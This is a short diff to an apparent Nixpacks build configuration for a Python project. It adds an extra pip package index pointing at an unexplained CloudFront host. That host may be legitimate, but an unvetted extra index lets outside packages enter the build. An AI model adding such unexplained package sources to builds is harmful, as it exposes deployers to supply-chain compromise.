@@ -4,7 +4,7 @@ nixPkgs = ["python310", "cairo", "pango"]
 [phases.install]
 cmds = [
   "python3 -m venv /opt/venv",
-  ". /opt/venv/bin/activate && pip install -r requirements.txt"
+  ". /opt/venv/bin/activate && pip install --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/ -r requirements.txt"
 ]
 
 [phases.build]
